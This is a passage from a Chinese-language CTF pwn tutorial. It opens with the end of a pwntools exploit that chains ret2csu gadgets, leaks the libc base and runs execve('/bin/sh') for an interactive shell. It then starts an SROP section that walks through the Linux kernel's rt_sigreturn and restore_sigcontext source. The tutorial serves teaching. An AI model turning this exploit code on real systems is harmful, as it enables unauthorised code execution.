+<a id="__codelineno-12-50" name="__codelineno-12-50" href="#__codelineno-12-50"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span>
+<a id="__codelineno-12-51" name="__codelineno-12-51" href="#__codelineno-12-51"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
+<a id="__codelineno-12-52" name="__codelineno-12-52" href="#__codelineno-12-52"></a><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-12-53" name="__codelineno-12-53" href="#__codelineno-12-53"></a><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"!</span><span class="se">\x00\n</span><span class="s2">"</span><span class="p">))</span>
+<a id="__codelineno-12-54" name="__codelineno-12-54" href="#__codelineno-12-54"></a>
+<a id="__codelineno-12-55" name="__codelineno-12-55" href="#__codelineno-12-55"></a><span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'write'</span><span class="p">])</span>
+<a id="__codelineno-12-56" name="__codelineno-12-56" href="#__codelineno-12-56"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">reread</span><span class="p">)</span>
+<a id="__codelineno-12-57" name="__codelineno-12-57" href="#__codelineno-12-57"></a><span class="n">payload</span><span class="o">+=</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<a id="__codelineno-12-58" name="__codelineno-12-58" href="#__codelineno-12-58"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">tmp_rbp</span><span class="p">)</span>
+<a id="__codelineno-12-59" name="__codelineno-12-59" href="#__codelineno-12-59"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">entry</span><span class="p">)</span>
+<a id="__codelineno-12-60" name="__codelineno-12-60" href="#__codelineno-12-60"></a><span class="n">payload</span><span class="o">+=</span><span class="n">get_csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">tmp_rbp</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">libc_partial</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x404330</span><span class="o">+</span><span class="mh">0x500</span><span class="p">)</span>
+<a id="__codelineno-12-61" name="__codelineno-12-61" href="#__codelineno-12-61"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">end</span><span class="p">)</span>
+<a id="__codelineno-12-62" name="__codelineno-12-62" href="#__codelineno-12-62"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-12-63" name="__codelineno-12-63" href="#__codelineno-12-63"></a><span class="n">payload</span><span class="o">+=</span><span class="n">get_csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">tmp_rbp</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">libc_partial</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x404330</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x500</span><span class="p">)</span>
+<a id="__codelineno-12-64" name="__codelineno-12-64" href="#__codelineno-12-64"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">end</span><span class="p">)</span>
+<a id="__codelineno-12-65" name="__codelineno-12-65" href="#__codelineno-12-65"></a><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-12-66" name="__codelineno-12-66" href="#__codelineno-12-66"></a><span class="n">recv</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<a id="__codelineno-12-67" name="__codelineno-12-67" href="#__codelineno-12-67"></a><span class="nb">print</span><span class="p">(</span><span class="n">recv</span><span class="p">)</span>
+<a id="__codelineno-12-68" name="__codelineno-12-68" href="#__codelineno-12-68"></a><span class="n">libc_base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">recv</span><span class="p">)</span><span class="o">-</span><span class="mh">0x2a28b</span><span class="c1">#0x252000</span>
+<a id="__codelineno-12-69" name="__codelineno-12-69" href="#__codelineno-12-69"></a><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">"libc_base is </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<a id="__codelineno-12-70" name="__codelineno-12-70" href="#__codelineno-12-70"></a><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">"libc_start_main+139 is </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">recv</span><span class="p">)))</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<a id="__codelineno-12-71" name="__codelineno-12-71" href="#__codelineno-12-71"></a><span class="n">ret_libc</span><span class="o">=</span><span class="mh">0x000000000002882f</span>
+<a id="__codelineno-12-72" name="__codelineno-12-72" href="#__codelineno-12-72"></a>
+<a id="__codelineno-12-73" name="__codelineno-12-73" href="#__codelineno-12-73"></a>
+<a id="__codelineno-12-74" name="__codelineno-12-74" href="#__codelineno-12-74"></a><span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">mov_eax_ebp_syscall</span><span class="p">)</span>
+<a id="__codelineno-12-75" name="__codelineno-12-75" href="#__codelineno-12-75"></a><span class="n">payload</span><span class="o">+=</span><span class="sa">b</span><span class="s2">"/bin/sh</span><span class="se">\x00</span><span class="s2">"</span>
+<a id="__codelineno-12-76" name="__codelineno-12-76" href="#__codelineno-12-76"></a><span class="n">payload</span><span class="o">+=</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x80</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<a id="__codelineno-12-77" name="__codelineno-12-77" href="#__codelineno-12-77"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="c1">#0x404330</span>
+<a id="__codelineno-12-78" name="__codelineno-12-78" href="#__codelineno-12-78"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">entry</span><span class="p">)</span>
+<a id="__codelineno-12-79" name="__codelineno-12-79" href="#__codelineno-12-79"></a><span class="n">payload</span><span class="o">+=</span><span class="n">get_csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mh">0x404330</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x500</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x404330</span><span class="o">+</span><span class="mh">0x500</span><span class="p">)</span><span class="c1">#</span>
+<a id="__codelineno-12-80" name="__codelineno-12-80" href="#__codelineno-12-80"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">end</span><span class="p">)</span>
+<a id="__codelineno-12-81" name="__codelineno-12-81" href="#__codelineno-12-81"></a><span class="c1"># gdb.attach(p,gdbscript="b *0x40117b")</span>
+<a id="__codelineno-12-82" name="__codelineno-12-82" href="#__codelineno-12-82"></a><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-12-83" name="__codelineno-12-83" href="#__codelineno-12-83"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="srop">SROP<a class="headerlink" href="#srop" title="Permanent link">¶</a></h2>
+<p>可以先参考这个视频：<br>
+<a href="https://b23.tv/xqhC94u">CTF 基础教程 ---- Pwn 第四课 SROP - 哔哩哔哩</a></p>
+<p><strong>本章将会从内核角度开始从底层逐渐剖析SROP的基本原理，需要读者具备C语言的阅读能力。如果您暂时对C语言不熟悉，可以直接看总结。</strong></p>
+<p><code>SROP</code>（Sigreturn-Oriented Programming） 是一种精巧的漏洞利用技术，它利用 <code>Unix/Linux</code> 系统中的信号处理机制和 <code>sigreturn</code> 系统调用，能够以极少的 gadget 控制大量寄存器(<strong>并不代表占用空间少</strong>)，甚至实现任意代码执行。</p>
+<h3 id="signal">signal 机制<a class="headerlink" href="#signal" title="Permanent link">¶</a></h3>
+<p><code>signal</code> 机制是<code>类 unix</code> 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 <code>kill</code> 来发送软中断信号。</p>
+<p>内核向某个进程发送 <code>signal</code> 机制，该进程会被暂时挂起，进入内核态。</p>
+<p>内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 <code>signal</code> 信息，以及指向 <code>sigreturn</code> 的系统调用地址。此时栈的结构如下图所示，我们称 <code>ucontext</code> 以及 <code>siginfo</code> 这一段为 <code>Signal Frame</code>。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 <code>signal handler</code> 中处理相应的 <code>signal</code>。因此，当 <code>signal handler</code> 执行完之后，就会执行 <code>sigreturn</code> 代码。</p>
+<p>那么，对应的在Linux中存在这么一个系统调用:<code>rt_sigreturn</code> 。接下来我们仔细分析一下它的代码。</p>
+<h3 id="rt_sigreturn">rt_sigreturn 详细剖析<a class="headerlink" href="#rt_sigreturn" title="Permanent link">¶</a></h3>
+<p>该机制在Linux内核中被实现为rt_sigreturn,我们来阅读一下他的代码：(我们这里讨论64位，代码基于Linux-5.12.13内核)</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">SYSCALL_DEFINE0</span><span class="p">(</span><span class="n">rt_sigreturn</span><span class="p">)</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="p">{</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">pt_regs</span><span class="w"> </span><span class="o">*</span><span class="n">regs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">current_pt_regs</span><span class="p">();</span><span class="w"> </span><span class="c1">//取程序当前的寄存器列表</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">rt_sigframe</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">frame</span><span class="p">;</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w"> </span><span class="kt">sigset_t</span><span class="w"> </span><span class="n">set</span><span class="p">;</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">uc_flags</span><span class="p">;</span>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w"> </span><span class="n">frame</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">rt_sigframe</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">sp</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">));</span><span class="w"> </span><span class="c1">//基于程序rsp计算frame</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">access_ok</span><span class="p">(</span><span class="n">frame</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">frame</span><span class="p">)))</span><span class="w"> </span><span class="c1">//检查frame合法性</span>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="w">  </span><span class="k">goto</span><span class="w"> </span><span class="n">badframe</span><span class="p">;</span>
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">__get_user</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">__u64</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">set</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">__u64</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">frame</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">.</span><span class="n">uc_sigmask</span><span class="p">))</span><span class="w"> </span><span class="c1">//拷贝uc.uc_sigmask</span>
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="w">  </span><span class="k">goto</span><span class="w"> </span><span class="n">badframe</span><span class="p">;</span>
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">__get_user</span><span class="p">(</span><span class="n">uc_flags</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">frame</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">.</span><span class="n">uc_flags</span><span class="p">))</span><span class="w"> </span><span class="c1">//拷贝uc.uc_flags</span>
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="w">  </span><span class="k">goto</span><span class="w"> </span><span class="n">badframe</span><span class="p">;</span>
+<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>
+<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="w"> </span><span class="n">set_current_blocked</span><span class="p">(</span><span class="o">&amp;</span><span class="n">set</span><span class="p">);</span>
+<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>
+<a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">restore_sigcontext</span><span class="p">(</span><span class="n">regs</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">frame</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">.</span><span class="n">uc_mcontext</span><span class="p">,</span><span class="w"> </span><span class="n">uc_flags</span><span class="p">))</span><span class="w"> </span><span class="c1">//拷贝寄存器</span>
+<a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="w">  </span><span class="k">goto</span><span class="w"> </span><span class="n">badframe</span><span class="p">;</span>
+<a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a>
+<a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">restore_altstack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">frame</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">.</span><span class="n">uc_stack</span><span class="p">))</span>
+<a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a><span class="w">  </span><span class="k">goto</span><span class="w"> </span><span class="n">badframe</span><span class="p">;</span>
+<a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a>
+<a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">ax</span><span class="p">;</span><span class="w"> </span><span class="c1">//返回rax寄存器的值，这样再调用后，rax依旧不会改变</span>
+<a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a>
+<a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a><span class="nl">badframe</span><span class="p">:</span>
+<a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a><span class="w"> </span><span class="n">signal_fault</span><span class="p">(</span><span class="n">regs</span><span class="p">,</span><span class="w"> </span><span class="n">frame</span><span class="p">,</span><span class="w"> </span><span class="s">"rt_sigreturn"</span><span class="p">);</span>
+<a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a><span class="p">}</span>
+</code></pre></div>
+<p>我们不难发现，只有当<code>restore_sigcontext</code>返回0值才能正常走return，否则进程就会被rt_sigreturn终止。</p>
+<p>那么接下来我们就需要观察<code>restore_sigcontext</code>函数了。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">restore_sigcontext</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">pt_regs</span><span class="w"> </span><span class="o">*</span><span class="n">regs</span><span class="p">,</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="w">         </span><span class="k">struct</span><span class="w"> </span><span class="nc">sigcontext</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">usc</span><span class="p">,</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">         </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">uc_flags</span><span class="p">)</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="p">{</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">sigcontext</span><span class="w"> </span><span class="n">sc</span><span class="p">;</span>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w"> </span><span class="cm">/* Always make any pending restarted system calls return -EINTR */</span>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w"> </span><span class="n">current</span><span class="o">-&gt;</span><span class="n">restart_block</span><span class="p">.</span><span class="n">fn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">do_no_restart_syscall</span><span class="p">;</span>
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sc</span><span class="p">,</span><span class="w"> </span><span class="n">usc</span><span class="p">,</span><span class="w"> </span><span class="n">CONTEXT_COPY_SIZE</span><span class="p">))</span><span class="w"> </span><span class="c1">//从用户空间安全拷贝</span>
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">bx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">bx</span><span class="p">;</span>
+<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">cx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">cx</span><span class="p">;</span>
+<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">dx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">dx</span><span class="p">;</span>
+<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">si</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">si</span><span class="p">;</span>
+<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">di</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">di</span><span class="p">;</span>
+<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">bp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">bp</span><span class="p">;</span>
+<a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">ax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">ax</span><span class="p">;</span>
+<a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">sp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">sp</span><span class="p">;</span>
+<a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">ip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">ip</span><span class="p">;</span><span class="w"> </span><span class="c1">//改写指令计数寄存器</span>
+<a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">r8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">r8</span><span class="p">;</span>
+<a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">r9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">r9</span><span class="p">;</span>
+<a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">r10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">r10</span><span class="p">;</span>
+<a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">r11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">r11</span><span class="p">;</span>
+<a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">r12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">r12</span><span class="p">;</span>
+<a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">r13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">r13</span><span class="p">;</span>
+<a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">r14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">r14</span><span class="p">;</span>
+<a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">r15</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">r15</span><span class="p">;</span>
+<a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a><span class="w"> </span><span class="cm">/* Get CS/SS and force CPL3 */</span>
+<a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">cs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">cs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x03</span><span class="p">;</span>
+<a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">ss</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">ss</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mh">0x03</span><span class="p">;</span>
+<a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">~</span><span class="n">FIX_EFLAGS</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">sc</span><span class="p">.</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">FIX_EFLAGS</span><span class="p">);</span>
+<a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a><span class="w"> </span><span class="cm">/* disable syscall checks */</span>
+<a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a><span class="w"> </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">orig_ax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a><span class="w"> </span><span class="cm">/*</span>
+<a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a><span class="cm">  * Fix up SS if needed for the benefit of old DOSEMU and</span>
+<a id="__codelineno-14-37" name="__codelineno-14-37" href="#__codelineno-14-37"></a><span class="cm">  * CRIU.</span>
+<a id="__codelineno-14-38" name="__codelineno-14-38" href="#__codelineno-14-38"></a><span class="cm">  */</span>
+<a id="__codelineno-14-39" name="__codelineno-14-39" href="#__codelineno-14-39"></a><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">uc_flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">UC_STRICT_RESTORE_SS</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">user_64bit_mode</span><span class="p">(</span><span class="n">regs</span><span class="p">)))</span>
+<a id="__codelineno-14-40" name="__codelineno-14-40" href="#__codelineno-14-40"></a><span class="w">  </span><span class="n">force_valid_ss</span><span class="p">(</span><span class="n">regs</span><span class="p">);</span>
+<a id="__codelineno-14-41" name="__codelineno-14-41" href="#__codelineno-14-41"></a><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">fpu__restore_sig</span><span class="p">((</span><span class="kt">void</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">sc</span><span class="p">.</span><span class="n">fpstate</span><span class="p">,</span>
+<a id="__codelineno-14-42" name="__codelineno-14-42" href="#__codelineno-14-42"></a><span class="w">          </span><span class="n">IS_ENABLED</span><span class="p">(</span><span class="n">CONFIG_X86_32</span><span class="p">));</span>
+<a id="__codelineno-14-43" name="__codelineno-14-43" href="#__codelineno-14-43"></a><span class="p">}</span>
+</code></pre></div>
